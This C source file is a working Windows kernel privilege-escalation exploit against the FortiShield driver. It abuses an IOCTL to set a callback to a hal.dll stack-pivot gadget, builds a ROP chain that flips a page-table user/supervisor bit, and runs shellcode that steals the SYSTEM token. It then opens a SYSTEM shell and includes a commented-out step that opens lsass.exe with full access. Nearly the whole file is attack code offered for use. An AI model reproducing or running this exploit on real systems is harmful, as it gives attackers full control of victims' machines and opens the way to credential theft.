////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>
#include <winreg.h>

// Definitions

////////////////////////////////////////////////////////////////////////////////////

#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define NTSTATUS int
#define IO_FORTISHIELD_SET_CALLBACK_ON_IRP_MJ_WRITE 0x220024
#define IO_FORTISHIELD_SET_CALLBACK_ON_IRP_MJ_SET_INFORMATION 0x220028

////////////////////////////////////////////////////////////////////////////////////

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation,
    SystemLocksInformation,
    SystemStackTraceInformation,
    SystemPagedPoolInformation,
    SystemNonPagedPoolInformation,
    SystemHandleInformation,
    SystemObjectInformation,
    SystemPageFileInformation,
    SystemVdmInstemulInformation,
    SystemVdmBopInformation,
    SystemFileCacheInformation,
    SystemPoolTagInformation,
    SystemInterruptInformation,
    SystemDpcBehaviorInformation,
    SystemFullMemoryInformation,
    SystemLoadGdiDriverInformation,
    SystemUnloadGdiDriverInformation,
    SystemTimeAdjustmentInformation,
    SystemSummaryMemoryInformation,
    SystemNextEventIdInformation,
    SystemEventIdsInformation,
    SystemCrashDumpInformation,
    SystemExceptionInformation,
    SystemCrashDumpStateInformation,
    SystemKernelDebuggerInformation,
    SystemContextSwitchInformation,
    SystemRegistryQuotaInformation,
    SystemExtendServiceTableInformation,
    SystemPrioritySeperation,
    SystemPlugPlayBusInformation,
    SystemDockInformation,
    SystemPowerInformation_,
    SystemProcessorSpeedInformation,
    SystemCurrentTimeZoneInformation,
    SystemLookasideInformation
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI *_NtAllocateVirtualMemory)
(
  HANDLE ProcessHandle,
  PVOID* BaseAddress,
  ULONG zerobytes,
  PSIZE_T RegionSize,
  ULONG AllocationType,
  ULONG Protect
);

typedef NTSTATUS (NTAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);


typedef struct
{
  PVOID Unknown1;
  PVOID Unknown2;
  PVOID Base;
  ULONG Size;
  ULONG Flags;
  USHORT Index;
  USHORT NameLength;
  USHORT LoadCount;
  USHORT PathLength;

  CHAR ImageName[256];

} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;


typedef struct
{

  ULONG Count;
  SYSTEM_MODULE_INFORMATION_ENTRY Module[1];

} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; 


typedef struct _UNICODE_STRING {
    USHORT         Length;
    USHORT         MaximumLength;
    PWSTR          Buffer;
} UNICODE_STRING;

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryDelta;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ProcessName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;



// Globals

////////////////////////////////////////////////////////////////////////////////////

_NtQuerySystemInformation NtQuerySystemInformation = NULL;
_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

//void *zero_addr = (void *)0x100804020001;
void *zero_addr = (void *)0x100804020000;

//void *address_magic_gadget = (void *) 0xfffff803a186dbf0;
char filename [ 256 ];
char filename2 [ 256 ];

////////////////////////////////////////////////////////////////////////////////////

// Functions

void error(char *message)
{
  printf("%s\n", message);
  printf("ERROR: %08x\n",GetLastError());
  getchar();
  exit(-1);
}

////////////////////////////////////////////////////////////////////////////////////

void resolve_functions(void)
{
  NtAllocateVirtualMemory = (_NtAllocateVirtualMemory) GetProcAddress( GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");

  if (NtAllocateVirtualMemory == NULL)
  {
   error("NtAllocateVirtualMemory wasn't found");
  }

  printf("NtAllocateVirtualMemory Address: %llx\n", NtAllocateVirtualMemory);

  NtQuerySystemInformation = (_NtQuerySystemInformation) GetProcAddress( GetModuleHandleA("ntdll"), "NtQuerySystemInformation");

  if (NtQuerySystemInformation == NULL)
  {
    error("NtQuerySystemInformation wasn't found");
  }
}

////////////////////////////////////////////////////////////////////////////////////

void allocate_stage0_page(void)
{
  char stage0 [] = {					
                     //0xcc,                    // breakpoint
					 // Get Eprocess
					 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  // mov    rax,QWORD PTR gs:0x188
					 // Get Ethread
					 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,				// mov    rax,QWORD PTR [rax+0xb8]
					 0x50,							                        // push   rax
					 0x48, 0x8d, 0x80, 0xf0, 0x02, 0x00, 0x00,				// lea    rax,[rax+0x2f0]
					 //<tag>
					 0x48, 0x8b, 0x00,										// mov    rax,QWORD PTR [rax]
					 0x48, 0x8b, 0x58, 0xf8,								// mov    rbx,QWORD PTR [rax-0x8]
					 0x48, 0x83, 0xfb, 0x04,								// cmp    rbx,0x4
					 0x75, 0xf3,											// jne    18 <tag>
					 0x48, 0x8b, 0x58, 0x68,								// mov    rbx,QWORD PTR [rax+0x68]
					 0x58,													// pop    rax
					 0x48, 0x89, 0x98, 0x58, 0x03, 0x00, 0x00,				// mov    QWORD PTR [rax+0x358],rbx

					 0x90, 0x90, 0x90, 0x90,
					 0x90, 0x90, 0x90, 0x90,
					 0x90, 0x90, 0x90, 0x90,
					 0x90, 0x90, 0x90, 0x90,
					 0x90, 0x90, 0x90, 0x90,				


					 // This part of the shellcode restores the context
                     0x48, 0x89, 0xf0,        // "mov rax,rsi"
                     0x48, 0x83, 0xe8, 0x28,  // "sub rax,28h"
                     0x48, 0x8b, 0x00,        // "mov rax,qword ptr [rax]"

                     // Nulling CALLBACK
                     0x48, 0x83, 0xc0, 0x07,  // "add rax,7"
                     0x8b, 0x58, 0x02,        // "mov ebx,dword ptr [rax+2]"
                     0x48, 0x01, 0xc3,        // "add rbx,rax"
                     0x48, 0x83, 0xc3, 0x06,  // "add rbx,6"
                     0x48, 0xc7, 0x03, 0x00, 0x00, 0x00, 0x00, // "mov qword ptr [rbx],0"

                     0x48, 0xbb, 0x00, 0x10, 0x02, 0x04, 0x08, 0x10, 0x00, 0x00, // "mov rbx,100804020000h"
                     0x48, 0xc7, 0x03, 0x33, 0x33, 0x33, 0x33,  // "mov qword ptr [rbx],33333333h"

                     // Restoring RBX
                     0x48, 0x31, 0xdb,        // "xor rbx,rbx"

                     // Changing return address to "+0x0d"
                     0x48, 0x83, 0xc0, 0x06,  // "add rax,06h"

                     // Restoring RSP
                     0x48, 0x8b, 0xe6,        // "mov rsp,rsi"
                     0x48, 0x83, 0xec, 0x20,  // "sub rsp,20h"

                     // Returning to the original control flow
                     0x50,                    // "push rax"
                     0xc3                     // "ret"
                   };

//  SIZE_T alloc_size = 0x1000;
  SIZE_T alloc_size = 0x2000;
		
  NTSTATUS alloc_status = NtAllocateVirtualMemory(GetCurrentProcess(), &zero_addr, 0, &alloc_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );	
//  NTSTATUS alloc_status = NtAllocateVirtualMemory(GetCurrentProcess(), &zero_addr, 0, &alloc_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE | PAGE_NOCACHE );	

  if (alloc_status != 0)
  {
    if (alloc_status == 0xc0000018)
    {
      printf("Error mapping: conflicting addresses\n");
    }

     printf("NtAllocateVirtualMemory failed %#08x\n", alloc_status);
     error("Failed Stage0 Allocation");
  }

  printf("Stage0 Allocation Success: %llx...\n", zero_addr);	

//  memset(zero_addr, 0x90, 0x1000);
  memset(zero_addr, 0x90, 0x2000);
  memcpy(zero_addr, stage0, sizeof(stage0));
}

////////////////////////////////////////////////////////////////////////////////////

void OverWriteFortiShieldAndExecuteCallback(PVOID Callback) 
{
  DWORD bytesReturned = 0;
  int status;
  PVOID inbuff = NULL;
  HANDLE hDevice = CreateFileA( "\\\\.\\FortiShield",
                                GENERIC_READ | GENERIC_WRITE,
                                0,
                                NULL, 
                                OPEN_EXISTING,
                                0,
                                NULL); 

  if (hDevice == (HANDLE)-1)
  {
    printf("Device couldn't be opened... \n");
    exit(-1);
  }

  printf("FortiShield handle: %#llx\n", hDevice);

  inbuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PVOID));
	
  *(PVOID *)((char*)inbuff+0x0) = Callback; // ADDRESS OF CALLBACK	
  DeviceIoControl(hDevice, IO_FORTISHIELD_SET_CALLBACK_ON_IRP_MJ_SET_INFORMATION, inbuff, sizeof(PVOID), NULL, NULL, &bytesReturned, NULL);
	
// Trigger the Callback right away!  
  MoveFileExA( filename , filename2 , 0xa );
}

////////////////////////////////////////////////////////////////////////////////////

__int64 get_pxe_address(__int64 address)
{
  __int64 result = address>>9;
  result = result | 0xFFFFF68000000000;
  result = result & 0xFFFFF6FFFFFFFFF8;

  return ( result );
}

////////////////////////////////////////////////////////////////////////////////////

void Ring0PrivilegesWithUSBit(void *address_magic_gadget)
{
  // Prepare the landing Page :)
  allocate_stage0_page();	

  OverWriteFortiShieldAndExecuteCallback(address_magic_gadget);
}

////////////////////////////////////////////////////////////////////////////////////

void *get_kernel_module_address ( char *module_name )
{
  SYSTEM_MODULE_INFORMATION *modules;
  void *base = NULL;
  unsigned int cont;
  int ret;

/* Memory to hold the moldes array */
  modules = ( SYSTEM_MODULE_INFORMATION * ) malloc ( 0x100000 );

/* Get Ntoskrnl base" */
  ret = NtQuerySystemInformation ( SystemModuleInformation , modules , 0x100000 , NULL );
  
  if ( ret == 0 )
  {  
    for ( cont = 0 ; cont < modules -> Count ; cont ++ )
    {
     printf ( "%s - %I64x\n" , modules -> Module [ cont ].ImageName , modules -> Module [ cont ].Base );

    /* Check if the module name matches */
      if ( strstr ( modules -> Module [ cont ].ImageName , module_name ) != 0 )
      {
      /* Object found */
        base = modules -> Module [ cont ].Base;   
        break;
      }
    }
  }

/* Return module base */
  return ( base );
}

////////////////////////////////////////////////////////////////////////////////////

unsigned int GetProcessPID(char *process_name)
{
  ULONG cbBuffer = 131072;
  PVOID pBuffer = NULL;
  char pName[256];
  unsigned int result = 0;
  PSYSTEM_PROCESS_INFO infoP = NULL;

  if (!NtQuerySystemInformation)
  {
	printf("Error: NtQuerySystemInformation isn't resolved\n");
	exit(-1);
  }

  pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBuffer);
  if (pBuffer == NULL) 
  {
	printf("HeapAlloc Error\n");
	return 0;
  }
  while (STATUS_INFO_LENGTH_MISMATCH == NtQuerySystemInformation(SystemProcessInformation, pBuffer, cbBuffer, &cbBuffer))    
  {
	HeapFree(GetProcessHeap(), NULL, pBuffer);
	printf("NtQuerySystemInformation Error\n");        
	cbBuffer *= 2;
	pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbBuffer);
	if (pBuffer == NULL) 
	{
	  printf("HeapAlloc Error\n");
	  return 0;
	}
  }  
  infoP = (PSYSTEM_PROCESS_INFO)pBuffer;
  while (infoP)
  {
	memset(pName, 0, sizeof(pName));
	if (0 == WideCharToMultiByte(CP_ACP, 0, infoP->ProcessName.Buffer, infoP->ProcessName.Length, pName, sizeof(pName), NULL, NULL))
	{
	  if (!infoP->NextEntryDelta) break;
	  infoP = (PSYSTEM_PROCESS_INFO)(((LPBYTE)infoP) + infoP->NextEntryDelta);					
	}
	if (strcmp(pName, process_name) == 0)
	{			
	  result = PtrToUint(infoP->ProcessId);
	  break;
	}			
	if (!infoP->NextEntryDelta) break;
	  infoP = (PSYSTEM_PROCESS_INFO)(((LPBYTE)infoP) + infoP->NextEntryDelta);		
  }
  if (pBuffer) HeapFree(GetProcessHeap(), NULL, pBuffer);

  return result;
}

void post_exploit(void)
{
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetProcessPID("lsass.exe"));
  printf("LSASS Handle: %llx\n", hProcess);
  CloseHandle(hProcess);
}

////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char* argv[])
{
  ULONGLONG ctime;
  unsigned char *p;
  HANDLE hDevice;
  void *buffer [ 3 ];
  char cmd [ 256 ];
  int bytesReturned;
  ULONGLONG hal;
  void *magic_stack_pivoting;

  printf("Starting...\n");
  resolve_functions();

  // Getting "hal.dll" base
  hal = ( ULONGLONG ) get_kernel_module_address ( "hal.dll" );
  printf ( "hal: %llx\n" , hal );

  // Getting first gadget (Stack Pivoting)
  magic_stack_pivoting = ( void * ) ( hal + 0x6bf0 );
 
  
  // Getting current time
  ctime = GetTickCount (); 

  // Building file names
  sprintf ( filename , "%llx_file.txt" , ctime );
  sprintf ( filename2 , "%llx_file2.txt" , ctime );

  printf ( "[x] Moving %s --> %s\n" , filename , filename2 );

  // Building and executing cmd line
  sprintf ( cmd , "echo hello > %s" , filename );
  system ( cmd );
//  printf ( "cmd: %s\n" , cmd );

  // This is the kernel stack we're faking to do the ROP chain
  p = (unsigned char *)VirtualAlloc (  ULongToPtr(0x480000DF) - 0x10000 , 0x20000 , 0x3000 , PAGE_EXECUTE_READWRITE );
  printf ( "%llx\n" , p );

  // Mapping memory
  memset ( p , 0xcc , 0x20000 );

  if ( p == NULL)
  {
    printf("Allocation error\n");
    exit(-1);
  }

//////////////////// 


* ( void ** ) &p [ 0x10000 + 0x177 + ( 8 * 0 ) ] = ( void * ) ( hal + 0x668e ); // "pop rdx # add al,1 # add bh,bh # ret"
* ( void ** ) &p [ 0x10000 + 0x177 + ( 8 * 1 ) ] = ( void * ) 0x63000000; // protection
* ( void ** ) &p [ 0x10000 + 0x177 + ( 8 * 2 ) ] = ( void * ) ( hal + 0x987e ); // "pop rax # ret"
* ( void ** ) &p [ 0x10000 + 0x177 + ( 8 * 3 ) ] = ( void * ) ( get_pxe_address(HandleToUlong(zero_addr)) - 3 );
* ( void ** ) &p [ 0x10000 + 0x177 + ( 8 * 4 ) ] = ( void * ) ( hal + 0xe2cf ); // "mov [rax],edx # ret"
* ( void ** ) &p [ 0x10000 + 0x177 + ( 8 * 5 ) ] = ( void * ) ( hal + 0x15a50 ); // "wbinvd # ret"
* ( void ** ) &p [ 0x10000 + 0x177 + ( 8 * 6 ) ] = ( void * ) zero_addr; // shellcode

//////////////////// 

  //__debugbreak();
  Ring0PrivilegesWithUSBit ( magic_stack_pivoting );

//////////////////// 

  printf ( "[x] opa opa !\n" );
  printf ( "----> %llx\n" , * ( void ** ) ( ( ULONGLONG ) zero_addr + 0x1000 ) );

//////////////////// 

  sprintf ( cmd , "del %s" , filename2 );
  system ( cmd );

  //post_exploit();
  system("cmd.exe");
  return 0;
}

////////////////////////////////////////////////////////////////////////////////////
